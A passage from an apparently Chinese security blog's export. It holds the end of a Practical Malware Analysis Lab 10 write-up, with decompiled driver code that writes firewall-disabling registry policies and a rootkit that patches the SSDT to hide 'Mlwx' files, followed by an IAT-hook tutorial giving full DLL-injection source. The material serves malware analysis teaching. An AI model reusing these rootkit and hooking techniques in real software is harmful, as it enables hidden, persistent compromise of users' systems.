RtlCreateRegistryKey(0, L&quot;\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\DomainProfile&quot;);  RtlCreateRegistryKey(0, L&quot;\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\StandardProfile&quot;);  RtlWriteRegistryValue(    0,    L&quot;\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\DomainProfile&quot;,    &amp;ValueName,    4u,    &amp;ValueData,    4u);  return RtlWriteRegistryValue(           0,           L&quot;\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\StandardProfile&quot;,           &amp;ValueName,           4u,           &amp;ValueData,           4u);&#125;\n\n\n\n使用windbg分析Lab10-01.sys首先将Lab10-01.sys复制到C:\\Windows\\System32\\Lab10-01.sys路径然后再进行实验\n我们可以使用Windbg检查Lab10-01.sys，来查看当前调用ControlService卸载驱动时会发生什么事情。用户空间可执行程序（Lab10-01.exe）的代码加载Lab10-01.sys，然后立即卸载它。如果我们在运行恶意可执行程序之前使用内核调试器，因为此时驱动还未在内核中，所以不能检查它。但是，等应用程序运行完成，那时驱动又已经从内存中卸载了。\n为了在Lab10-01.sys载入内存后，使用Windbg分析它，在虚拟机中，将可执行程序（Lab10-01.exe）载入x32dbg中，然后在驱动加载和卸载之间设置断点（在call ControlService时）并运行，一旦程序在断点处暂停，就回到内核调试器（Break）。\n![在call ControlService处设置断点](.&#x2F;《恶意代码分析实战》——Lab10.1&#x2F;在call ControlService处设置断点.png)\n我们知道要分析的服务叫”Lab10-01”，可以通过使用命令!drvobj来获取驱动对象：\n123456780: kd&gt; !drvobj Lab10-01Driver object (871df558) is for: \\Driver\\Lab10-01Driver Extension List: (id , addr)Device Object list:\n\n\n\n\n\n\n\n\n\n\n为了解决任何难以定位的服务名，可以使用!object \\Driver命令获取当前内核驱动对象列表\n通过命令!drvobj可以获取驱动对象的地址（871df558）。因为在设备对象列表中没有设备列出，所以这个驱动没有供用户空间程序访问的设备。\n一旦获得驱动对象的地址，可以使用dt命令查看它：\n12345678910111213141516170: kd&gt; dt _DRIVER_OBJECT 871df558nt!_DRIVER_OBJECT   +0x000 Type             : 0n4   +0x002 Size             : 0n168   +0x004 DeviceObject     : (null)    +0x008 Flags            : 0x12   +0x00c DriverStart      : 0x95197000 Void   +0x010 DriverSize       : 0xe80   +0x014 DriverSection    : 0x85ed3ec0 Void   +0x018 DriverExtension  : 0x871df600 _DRIVER_EXTENSION   +0x01c DriverName       : _UNICODE_STRING &quot;\\Driver\\Lab10-01&quot;   +0x024 HardwareDatabase : 0x8418c270 _UNICODE_STRING &quot;\\REGISTRY\\MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM&quot;   +0x028 FastIoDispatch   : (null)    +0x02c DriverInit       : 0x95197959     long  +0   +0x030 DriverStartIo    : (null)    +0x034 DriverUnload     : 0x95197486     void  +0   +0x038 MajorFunction    : [28] 0x83ec279b     long  nt!IopInvalidDeviceRequest+0\n\n尝试确定驱动卸载时调用的函数——偏移量0x034的信息DriverUnload，然后使用入以下命令设置一个断点：\n1230: kd&gt;bp 0x95197486或0: kd&gt;bp 0xffffffff95197486 \n\n设置断点后，恢复内核运行（g）。然后回到虚拟机中运行x32dbg。由于在内核调试器命中了断点，整个Guest OS会卡死。此时，回到内核调试器（Break）并且单步运行，可以看到几处call esi\n使用下面命令查看esi所指的函数为nt!RtlCreateRegistryKey和：\n123456789101112131415161718192021222324250: kd&gt; r esiesi=83fa52460: kd&gt; u ffffffff83fa5246nt!RtlCreateRegistryKey:83fa5246 8bff            mov     edi,edi83fa5248 55              push    ebp83fa5249 8bec            mov     ebp,esp83fa524b 8b4d0c          mov     ecx,dword ptr [ebp+0Ch]83fa524e 8b5508          mov     edx,dword ptr [ebp+8]83fa5251 8d450c          lea     eax,[ebp+0Ch]83fa5254 50              push    eax83fa5255 6a01            push    10: kd&gt; r esiesi=83fe62180: kd&gt; u ffffffff83fe6218nt!RtlWriteRegistryValue:83fe6218 8bff            mov     edi,edi83fe621a 55              push    ebp83fe621b 8bec            mov     ebp,esp83fe621d 8b4d0c          mov     ecx,dword ptr [ebp+0Ch]83fe6220 8b5508          mov     edx,dword ptr [ebp+8]83fe6223 83ec0c          sub     esp,0Ch83fe6226 56              push    esi83fe6227 8d450c          lea     eax,[ebp+0Ch]\n\n如果在0x95197486处的卸载函数DriverUnload很长或很复杂，使用windbg较难分析它。多数情况下，一旦确定了函数的位置，可以使用ida进行分析。但windbg中的函数位置与ida中不一样，所以为了在ida中查看函数，还要进行手动计算。\n首先使用lm命令，计算函数从windbg加载文件开始处的偏移量，\n12345678910111213141516171819202122230: kd&gt; lmstart    end        module name83e0b000 84233000   nt         (pdb symbols)          C:\\ProgramData\\Dbg\\sym\\ntkrpamp.pdb\\5D110DC0022948A3B3FAF52F08E778402\\ntkrpamp.pdb950ca000 950dc000   BTHUSB     (deferred)             950dc000 95140000   bthport    (deferred)             95140000 95164000   rfcomm     (deferred)             95164000 95171000   BthEnum    (deferred)             95171000 9518c000   bthpan     (deferred)             9518c000 95197000   monitor    (deferred)             95197000 95197e80   Lab10_01   (no symbols)           Unloaded modules:905f3000 905fe000   monitor.sys8ac1c000 8ac80000   bthport.sys90400000 90412000   BTHUSB.sys8aca4000 8acb1000   BthEnum.sys8ac80000 8aca4000   rfcomm.sys8acb1000 8accc000   bthpan.sys9705b000 97073000   parport.sys89c2d000 89c3a000   crashdmp.sys8a019000 8a023000   dump_storport.sys89a00000 89a18000   dump_LSI_SAS.sys89def000 89e00000   dump_dumpfve.sys\n\n可以看到，文件被加载到0x95197000。从前面可知，卸载函数位于0x95197486处，从0x95197486减去0x95197000得到偏移量（0x486）。然后在ida中跳到卸载函数。例如，若ida中加载中基地址（imagebase）是0x100000，则在0x100000+0x486&#x3D;0x100486处找到卸载函数然后进行静态分析。另一种方法是，在ida中，通过edit—&gt;segment—&gt;rebase program来修改基地址，将地址0x100000修改为0x95197000。\n《恶意代码分析实战》——Lab10.2静态分析-Lab10-02.exe使用ida查看Lab10-02.exe主函数，可以看出该程序首先会获取编号为0x65（101）的资源，然后写入C:\\Windows\\System32\\Mlwx486.sys，并以此创建服务。这个文件包含了由操作系统加载的内核代码。\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354int __cdecl main(int argc, const char **argv, const char **envp)&#123;  HRSRC v3; // edi@1  HGLOBAL v4; // ebx@1  HANDLE v5; // esi@2  DWORD v6; // eax@3  SC_HANDLE v7; // eax@3  SC_HANDLE v9; // eax@5  void *v10; // esi@5  DWORD NumberOfBytesWritten; // [sp+Ch] [bp-4h]@3  v3 = FindResourceA(0, (LPCSTR)0x65, &quot;FILE&quot;);  v4 = LoadResource(0, v3);  if ( v3 )  &#123;    v5 = CreateFileA(&quot;C:\\\\Windows\\\\System32\\\\Mlwx486.sys&quot;, 0xC0000000, 0, 0, 2u, 0x80u, 0);    if ( v5 != (HANDLE)-1 )    &#123;      v6 = SizeofResource(0, v3);      WriteFile(v5, v4, v6, &amp;NumberOfBytesWritten, 0);      CloseHandle(v5);      v7 = OpenSCManagerA(0, 0, 0xF003Fu);      if ( !v7 )      &#123;        printf(&quot;Failed to open service manager.\\n&quot;);        return 0;      &#125;      v9 = CreateServiceA(             v7,             &quot;486 WS Driver&quot;,             &quot;486 WS Driver&quot;,             0xF01FFu,             1u,             3u,             1u,             &quot;C:\\\\Windows\\\\System32\\\\Mlwx486.sys&quot;,             0,             0,             0,             0,             0);      v10 = v9;      if ( !v9 )      &#123;        printf(&quot;Failed to create service.\\n&quot;);        return 0;      &#125;      if ( !StartServiceA(v9, 0, 0) )        printf(&quot;Failed to start service.\\n&quot;);      CloseServiceHandle(v10);    &#125;  &#125;  return 0;&#125;\n\n接下来应该查找程序创建的文件，以便分析并且确定内核代码做了什么。但是查找C:\\Windows\\System32\\Mlwx486.sys时，却没有出现，怀疑这是一个Rootkit。\n查找Rootkit为了进一步调查，要检查内核驱动是否被加载。使用cmd执行sc命令检查运行内核驱动程序的服务状态：\n1sc query &quot;486 WS Driver&quot;\n\n查询名为”486 WS Driver”的服务，它在Lab10-02.exe的CreateServiceA中被指定。可以看到该服务仍然在运行，这表明内核代码在内存中。奇怪的是驱动仍然在运行，但是它没有在硬盘上。使用windbg命令lm查询驱动是否被真正加载。\n看到了一个与Lab10-02.exe创建文件名（Mlwx486.sys）匹配的条目Mlwx486。\n现在确定文件名为Mlwx486.sys的驱动被载入内存，但是文件没有在硬盘上显示，这暗示它可能是一个Rootkit。\n接下来，检查SSDT的所有修改项       \n1234567891011120: kd&gt; dd dwo(KeServiceDescriptorTable) L100ReadVirtual: 83e76e3c not properly sign extended......83e76e4c  84094933 83f125cc 84107433 8410747c83e76e5c  84015dc8 84122cfc 84123f55 8400c55783e76e6c  8409efd5 840f9da5 8404a210 8401911f83e76e7c  83faeb85 840eb490 83fffacf 84042faf83e76e8c  84090200 fffef813 8408f60d 8400d5d183e76e9c  840a0a71 8400fc66 840a0851 84098fd883e76eac  84021e2f 840e5a51 840963b9 840a0ca383e76ebc  840792f2 84094362 84024a88 84018753......\n\n可以看到第五行的fffef813明显位于ntoskrnl模块的范围外，位于加载的Mlwx486.sys的驱动内。将虚拟机恢复到Rootkit安装之前的状态，查看存储在SSDT中的哪个函数被覆盖了。\n\n\n\n\n\n\n\n\n\n当检查SSDT 时，应观察其函数指针是否存在NT模块的地址范围内，如果Rootkit挂钩了其中某个函数，则这个函数指针可能不在NT模块的地址范围内。\n可以使用命令lm m nt查看SSDT列表，若发现不在地址范围内的函数指针，则首先使用lm命令查询模块列表，确认函数指针在哪个模块，定位了驱动程序，就可以查找挂钩代码并进行分析\n本例中被覆盖的是NtQueryDirectoryFile，它是一个提取文件和目录信息的通用函数，而FindFirstFile和FindNextFile都是调用它来遍历目录结构的。Windows资源管理器也会利用它来显示文件和目录\n分析挂钩函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475NTSTATUS __stdcall sub_10706(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123;  PVOID v2; // edi@1  PVOID *v3; // eax@1  signed int v4; // ecx@1  UNICODE_STRING SystemRoutineName; // [sp+8h] [bp-10h]@1  UNICODE_STRING DestinationString; // [sp+10h] [bp-8h]@1  RtlInitUnicodeString(&amp;DestinationString, L&quot;NtQueryDirectoryFile&quot;);  RtlInitUnicodeString(&amp;SystemRoutineName, L&quot;KeServiceDescriptorTable&quot;);  v2 = MmGetSystemRoutineAddress(&amp;DestinationString);  v3 = *(PVOID **)MmGetSystemRoutineAddress(&amp;SystemRoutineName);  v4 = 0;  do  &#123;    ++v3;    if ( *v3 == v2 )      break;    ++v4;  &#125;  while ( v4 &lt; 284 );  dword_1068C = (int)v2;  dword_10690 = (int)v3;  *v3 = sub_10486;  return 0;&#125;NTSTATUS __stdcall sub_10486(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG FileInformationLength, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan)&#123;  char *v11; // esi@1  NTSTATUS v12; // eax@1  char *v13; // edi@1  char v14; // bl@4  NTSTATUS RestartScana; // [sp+38h] [bp+30h]@1  v11 = (char *)FileInformation;  v12 = NtQueryDirectoryFile(          FileHandle,          Event,          ApcRoutine,          ApcContext,          IoStatusBlock,          FileInformation,          FileInformationLength,          FileInformationClass,          ReturnSingleEntry,          FileName,          RestartScan);  v13 = 0;  RestartScana = v12;  if ( FileInformationClass == FileBothDirectoryInformation &amp;&amp; v12 &gt;= 0 &amp;&amp; !ReturnSingleEntry )  &#123;    while ( 1 )    &#123;      v14 = 0;      if ( RtlCompareMemory(v11 + 0x5E, L&quot;Mlwx&quot;, 8u) == 8 )      &#123;        v14 = 1;        if ( v13 )        &#123;          if ( *(_DWORD *)v11 )            *(_DWORD *)v13 += *(_DWORD *)v11;          else            *(_DWORD *)v13 = 0;        &#125;      &#125;      if ( !*(_DWORD *)v11 )        break;      if ( !v14 )        v13 = v11;      v11 += *(_DWORD *)v11;    &#125;  &#125;  return RestartScana;&#125;\n\n对于NtQueryDirectoryFile函数，若FileInformationClass为FileBothDirectoryInformation（3），则执行函数后，FileInformation会被填充为_FILE_BOTH_DIR_INFORMATION结构体。\n123456789101112131415161700000000 _FILE_BOTH_DIR_INFORMATION struc ; (sizeof=0x60, align=0x8, copyof_14)00000000 NextEntryOffset dd ?00000004 FileIndex       dd ?00000008 CreationTime    LARGE_INTEGER ?00000010 LastAccessTime  LARGE_INTEGER ?00000018 LastWriteTime   LARGE_INTEGER ?00000020 ChangeTime      LARGE_INTEGER ?00000028 EndOfFile       LARGE_INTEGER ?00000030 AllocationSize  LARGE_INTEGER ?00000038 FileAttributes  dd ?0000003C FileNameLength  dd ?00000040 EaSize          dd ?00000044 ShortNameLength db ?00000045                 db ? ; undefined00000046 ShortName       dw 12 dup(?)0000005E FileName        dw ?00000060 _FILE_BOTH_DIR_INFORMATION ends\n\n挂钩函数为sub_10486，其功能是调用RtlCompareMemory比较文件名（FileInformation+0x5E）开头四字节是否是（”Mlwx”），若是，则从_FILE_BOTH_DIR_INFORMATION链表中删除，以隐藏该文件\n参考链接\nhttps://www.cnblogs.com/joneyyana/p/12585469.html\nhttps://blog.csdn.net/qq_38474570/article/details/103674271\nhttps://blog.csdn.net/qq_41988448/article/details/102994374\nhttps://cata1oc.github.io/2020/03/27/API%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%88%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E8%A1%A8%EF%BC%89/\nhttps://www.bilibili.com/video/BV1NJ411M7aE?p=41\nhttps://blog.csdn.net/zahngzhic/article/details/131755579\n\n","slug":"SSDT Hook","date":"2022-03-26T11:33:07.000Z","categories_index":"","tags_index":"hook技术,逆向工程核心原理,API hook,SSDT,系统调用","author_index":"0netry"},{"id":"0f25dc3ea7a3ffec9ce07cef8295e4e2","title":"IAT Hook","content":"IAT Hook前置知识通过注入DLL文件来钩取某个API，DLL文件注入目标进程后，修改IAT来更改进程中调用的特定API功能。\nAPI功能\nkernel32!CreateFile()：创建文件\n\nadvapi32!RegCreateKeyEx()：创建注册表新键\n\nws2_32!connect()：网络连接\n\n\nIAT钩取工作原理这种Hook技术是通过分析目标程序PE结构，替换目标API在IAT中的地址为钩子函数的地址来实现。\nIAT和PE文件结构要了解这种Hook技术，首先需要知道IAT和PE文件结构。\nPE文件是Windows下可执行文件和DLL等文件的一种规范。实际上，exe文件在磁盘中的映射就是PE格式，可以通过PE工具查看exe文件来进行研究。\n当程序被加载的时候，windows加载函数会定位所有的导入数据和代码，这样的实际做法就是将DLL文件映射到进程的地址空间中，实际上这个映射的过程就是通过PE文件的头部信息来实施的，因为PE文件头部中存储了所有需要导入的DLL的模块名称以及导入函数。\n实际上IAT存储了进程中所有的导入的DLL和其对应的导入函数的信息，要找到某个导入函数的地址，那么必须要定位到导入表。因为导入表的存储位置就在PE文件头中，所以了解PE文件是非常有必要的。\nPE文件的真正头部紧接Dos头，在Dos头的最后一个字段e_lfanew指向的是PE头的地址，在PE Header的结构IMAGE_NT_HEADER中，有一个结构IMAGE_OPTIONAL_HEADER，这个结构中有一个IMAGE_DATA_DIRECTORY（数据目录）类型的数组，其中第二个元素就是存储的导入表的相对虚拟地址和大小，通过这个可以定位到导入表的地址，从而找到对应的函数的地址。\n导入表的结构为IAMGE_IMPORT_DESCRIPTOR ，它的第一个参数OriginFirstThunk和最后一个参数FirstThunk分别指向的是同一种结构IMAGE_THUNK_DATA，但是因为这个结构体中是一个联合结构，所以根据这个DWORD类型的值的不同所表示的意义也不同。OriginFirstThunk指向的这个结构表示的是一个导入序号；而FirstThunk指向的这个结构表示的是函数的名字，这时DWORD的值表示的是一个RVA，并指向个IMAGE_IMPORT_BY_NAME结构。\n在装载PE文件的时候，装载器会遍历OriginFirstThunk指向的IMAGE_THUNK_DATA数组，找到每个IAMGE_THUNK_DATA结构中函数所对应的地址，然后加载器用函数真正的入口地址来代替FirstThunk指向的数组，这个地址数组我们称之为IAT（导入地址表）。\nIAT HOOK介绍了原理，下面就是最重要的东西了——IAT HOOK。\n那么我们的钩子函数从何而来呢？依然是两种方法可以获得，第一种是API函数；另一种是我们自己构造的函数，而我们构造的函数可以通过直接注入代码到目标进程或通过注入DLL而来导入我们的函数进入目标进程。\n实际上到这里我们的思路已经很清晰了，只要修改IAT中函数的入口点地址为我们构造的函数的地址，那么程序调用此API时实际上调用的就是我们自己构造的函数。既然要修改IAT中的内容，那么就必须要定位IAT的地址。\n上面的过程可以描述为:对于一个PE文件映像，从偏移位置0开始就是Dos Header,在Dos头中我们知道有一个指针e_lfanew指向真正的PE文件头，通过PE文件头可以得到数据目录，而数据目录的第二个元素就是存储的导入表的信息，通过导入表的信息我们可以定位到导入表，其结构为IMAGE_IMPORT_DESCRIPTOR，再通过遍历所有的IMAGE_IMPORT_DESCRIPTOR结构可以得到所有的DLL文件名，通过遍历每个结构的FirstThunk成员可以得到每个函数的地址，通过遍历每个结构的OriginalFirstThunk所指向的IMAGE_IMPORT_BY_NAME可以得到每个函数的导出函数名。\n基于Win10的计算器显示中文数字练习1.运行过程展示将calc.exe、InjectDll.exe、hookiat.dll复制到同一个目录下，运行calc.exe，然后打开Process Explorer查看计算器的PID，接着在命令窗口输入命令InjectDll.exe i PID hookiat.dll  ，即可将hookiat.dll注入到计算器中（可在Process Explorer查看到），接着输入数字时可以发现显示了中文\n![IAT Hook计算器显示中文数字结果](.&#x2F;IAT Hook计算器显示中文数字结果.png)\n2.代码流程分析源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127// include#include &quot;stdio.h&quot;#include &quot;wchar.h&quot;#include &quot;windows.h&quot;// typedeftypedef BOOL (WINAPI *PFSETWINDOWTEXTW)(HWND hWnd, LPWSTR lpString);// globalsFARPROC g_pOrgFunc = NULL;BOOL WINAPI MySetWindowTextW(HWND hWnd, LPWSTR lpString)&#123;    wchar_t* pNum = L&quot;零一二三四五六七八九&quot;;    wchar_t temp[2] = &#123;0,&#125;;    int i = 0, nLen = 0, nIndex = 0;    nLen = wcslen(lpString);    for(i = 0; i &lt; nLen; i++)    &#123;        //将阿拉伯数字转换为中文数字        //lpString是 wide-character (宽字符，2 byte)字符串        if( L&#x27;0&#x27; &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= L&#x27;9&#x27; )        &#123;            temp[0] = lpString[i];            nIndex = _wtoi(temp);            lpString[i] = pNum[nIndex];        &#125;    &#125;    // 调用user32!SetWindowTextW() API    // (修改lpString缓冲区中的内容)    return ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);&#125;BOOL hook_iat(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)&#123;\tHMODULE hMod;\tLPCSTR szLibName;\tPIMAGE_IMPORT_DESCRIPTOR pImportDesc; \tPIMAGE_THUNK_DATA pThunk;\tDWORD dwOldProtect, dwRVA;\tPBYTE pAddr;    // hMod, pAddr = ImageBase of calc.exe    //             = VA to MZ signature (IMAGE_DOS_HEADER)\thMod = GetModuleHandle(NULL);\tpAddr = (PBYTE)hMod;    // pAddr = VA to PE signature (IMAGE_NT_HEADERS)\tpAddr += *((DWORD*)&amp;pAddr[0x3C]);    // dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table\tdwRVA = *((DWORD*)&amp;pAddr[0x80]);    // pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table\tpImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA);\tfor( ; pImportDesc-&gt;Name; pImportDesc++ )\t&#123;        // szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name\t\tszLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name);\t\tif( !_stricmp(szLibName, szDllName) )\t\t&#123;            // pThunk = IMAGE_IMPORT_DESCRIPTOR.FirstThunk            //        = VA to IAT(Import Address Table)\t\t\tpThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod +                                          pImportDesc-&gt;FirstThunk);            // pThunk-&gt;u1.Function = VA to API\t\t\tfor( ; pThunk-&gt;u1.Function; pThunk++ )\t\t\t&#123;\t\t\t\tif( pThunk-&gt;u1.Function == (DWORD)pfnOrg )\t\t\t\t&#123;                    // 更改内存属性为E/R/W\t\t\t\t\tVirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function,                                    4,                                    PAGE_EXECUTE_READWRITE,                                    &amp;dwOldProtect);                    // 修改IAT值（钩取）                    pThunk-&gt;u1.Function = (DWORD)pfnNew;\t\t\t\t\t                    // 恢复内存属性                    VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function,                                    4,                                    dwOldProtect,                                    &amp;dwOldProtect);\t\t\t\t\t\t\t\t\t\t\treturn TRUE;\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t&#125;\treturn FALSE;&#125;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;\tswitch( fdwReason )\t&#123;\t\tcase DLL_PROCESS_ATTACH :             // 保存原始API地址           \tg_pOrgFunc = GetProcAddress(GetModuleHandle(L&quot;user32.dll&quot;),                                         &quot;SetWindowTextW&quot;);            // # hook            // 用hookiat!MySetWindowText()钩取user32!SetWindowTextW()\t\t\thook_iat(&quot;user32.dll&quot;, g_pOrgFunc, (PROC)MySetWindowTextW);\t\t\tbreak;\t\tcase DLL_PROCESS_DETACH :            // # unhook            // 将calc.exe的IAT恢复原值            hook_iat(&quot;user32.dll&quot;, (PROC)MySetWindowTextW, g_pOrgFunc);\t\t\tbreak;\t&#125;\treturn TRUE;&#125;\n\nDllMain()1234567891011121314151617181920212223BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;\tswitch( fdwReason )\t&#123;\t\tcase DLL_PROCESS_ATTACH :             // 保存原始API地址           \tg_pOrgFunc = GetProcAddress(GetModuleHandle(L&quot;user32.dll&quot;),                                         &quot;SetWindowTextW&quot;);            // # hook            // 用hookiat!MySetWindowText()钩取user32!SetWindowTextW()\t\t\thook_iat(&quot;user32.dll&quot;, g_pOrgFunc, (PROC)MySetWindowTextW);\t\t\tbreak;\t\tcase DLL_PROCESS_DETACH :            // # unhook            // 将calc.exe的IAT恢复原值            hook_iat(&quot;user32.dll&quot;, (PROC)MySetWindowTextW, g_pOrgFunc);\t\t\tbreak;\t&#125;\treturn TRUE;&#125;\n\n保存SetWindowTextW()地址\n在DLL_PROCESS_ATTACH事件中先获取user32.SetWindowTextW()的地址，然后将其保存到全局变量g_pOrgFunc中后面脱钩时会用到这个地址\nIAT钩取\n1hook_iat(&quot;user32.dll&quot;, g_pOrgFunc, (PROC)MySetWindowTextW);\n\n调用hook_iat函数钩取IAT（即将user32!SetWindowTextW()的地址更改为hookiat!MySetWindowText()的地址）。上面语句是发生DLL加载事件（DLL_PROCESS_ATTACH）时执行的所有操作。\nIAT脱钩\n1hook_iat(&quot;user32.dll&quot;, (PROC)MySetWindowTextW, g_pOrgFunc);\n\n卸载DLL时会触发DLL_PROCESS_DETACH事件，发生该事件时，将进行IAT脱钩（即将用hookiat!MySetWindowText()的地址更改为user32!SetWindowTextW()的地址）\nMySetWindowTextW()——钩取函数（钩子函数）1234567891011121314151617181920212223BOOL WINAPI MySetWindowTextW(HWND hWnd, LPWSTR lpString)&#123;    wchar_t* pNum = L&quot;零一二三四五六七八九&quot;;    wchar_t temp[2] = &#123;0,&#125;;    int i = 0, nLen = 0, nIndex = 0;    nLen = wcslen(lpString);    for(i = 0; i &lt; nLen; i++)    &#123;        //将阿拉伯数字转换为中文数字        //lpString是 wide-character (宽字符，2 byte)字符串        if( L&#x27;0&#x27; &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= L&#x27;9&#x27; )        &#123;            temp[0] = lpString[i];            nIndex = _wtoi(temp);            lpString[i] = pNum[nIndex];        &#125;    &#125;    // 调用user32!SetWindowTextW() API    // (修改lpString缓冲区中的内容)    return ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);&#125;\n\n计算器进程的IAT被钩取后，每当代码中调用user32!SetWindowTextW()函数时，都会先调用hookiat!MySetWindowText()函数。\n接下来分析hookiat!MySetWindowText()函数的重要代码。hookiat!MySetWindowText()函数的lpString参数是一块缓冲区，该缓冲区用来存放要输出显示的字符串，所以操作lpString参数即可在计算器中显示用户指定的字符串。for循环结束，代码return ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);最后再调用函数指针g_pOrgFunc，它指向user32!SetWindowTextW()函数的起始地址（该地址在DllMain中已经获取并保存下来），也就是说，调用原来的SetWindowTextW()函数，将中文数字显示在计算器的显示框中。、\nhook_iat()该函数是具体执行IAT钩取的函数。\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162BOOL hook_iat(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)&#123;\tHMODULE hMod;\tLPCSTR szLibName;\tPIMAGE_IMPORT_DESCRIPTOR pImportDesc; \tPIMAGE_THUNK_DATA pThunk;\tDWORD dwOldProtect, dwRVA;\tPBYTE pAddr;    // hMod, pAddr = ImageBase of calc.exe    //             = VA to MZ signature (IMAGE_DOS_HEADER)\thMod = GetModuleHandle(NULL);\tpAddr = (PBYTE)hMod;    // pAddr = VA to PE signature (IMAGE_NT_HEADERS)\tpAddr += *((DWORD*)&amp;pAddr[0x3C]);    // dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table\tdwRVA = *((DWORD*)&amp;pAddr[0x80]);    // pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table\tpImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA);\tfor( ; pImportDesc-&gt;Name; pImportDesc++ )\t&#123;        // szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name\t\tszLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name);\t\tif( !_stricmp(szLibName, szDllName) )\t\t&#123;            // pThunk = IMAGE_IMPORT_DESCRIPTOR.FirstThunk            //        = VA to IAT(Import Address Table)\t\t\tpThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod +                                          pImportDesc-&gt;FirstThunk);            // pThunk-&gt;u1.Function = VA to API\t\t\tfor( ; pThunk-&gt;u1.Function; pThunk++ )\t\t\t&#123;\t\t\t\tif( pThunk-&gt;u1.Function == (DWORD)pfnOrg )\t\t\t\t&#123;                    // 更改内存属性为E/R/W\t\t\t\t\tVirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function,                                    4,                                    PAGE_EXECUTE_READWRITE,                                    &amp;dwOldProtect);                    // 修改IAT值（钩取）                    pThunk-&gt;u1.Function = (DWORD)pfnNew;\t\t\t\t\t                    // 恢复内存属性                    VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function,                                    4,                                    dwOldProtect,                                    &amp;dwOldProtect);\t\t\t\t\t\t\t\t\t\t\treturn TRUE;\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t&#125;\treturn FALSE;&#125;\n\n12345678910111213141516171819202122232425262728293031323334353637int __cdecl sub_10001090(int a1, DWORD a2)&#123;  HMODULE ModuleHandleW; // edi  int import_dll_name_rva; // ebx  IMAGE_THUNK_DATA *first_trunk; // esi  DWORD flOldProtect; // [esp+10h] [ebp-4h] BYREF  ModuleHandleW = GetModuleHandleW(0);  import_dll_name_rva = (int)ModuleHandleW                      + *(_DWORD *)((char *)ModuleHandleW + *((_DWORD *)ModuleHandleW + 0xF) + 0x80)                      + 0xC;  if ( !*(_DWORD *)import_dll_name_rva )    return 0;  while ( 1 )  &#123;    if ( !_stricmp((const char *)ModuleHandleW + *(_DWORD *)import_dll_name_rva, &quot;user32.dll&quot;) )    &#123;      first_trunk = (IMAGE_THUNK_DATA *)((char *)ModuleHandleW + *(_DWORD *)(import_dll_name_rva + 4));      if ( first_trunk-&gt;Function )        break;    &#125;LABEL_6:    import_dll_name_rva += 0x14;    if ( !*(_DWORD *)import_dll_name_rva )      return 0;  &#125;  while ( first_trunk-&gt;Function != a1 )  &#123;    ++first_trunk;    if ( !first_trunk-&gt;Function )      goto LABEL_6;  &#125;  VirtualProtect(first_trunk, 4u, 0x40u, &amp;flOldProtect);  first_trunk-&gt;Function = a2;  VirtualProtect(first_trunk, 4u, flOldProtect, &amp;flOldProtect);  return 1;&#125;\n\n读取PE文件头信息并查找IAT位置\n123456789101112131415//获取当前的ImagBase(基址)// hMod, pAddr = ImageBase of calc.exe//             = VA to MZ signature (IMAGE_DOS_HEADER)hMod = GetModuleHandle(NULL);//获取DOS头pAddr = (PBYTE)hMod;//获取NT头// pAddr = VA to PE signature (IMAGE_NT_HEADERS)pAddr += *((DWORD*)&amp;pAddr[0x3C]);//获取IMAGE_IMPORT_DESCRIPTOR的RVA// dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR TabledwRVA = *((DWORD*)&amp;pAddr[0x80]);//获取IMAGE_IMPORT_DESCRIPTOR的VA// pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR TablepImportDesc = 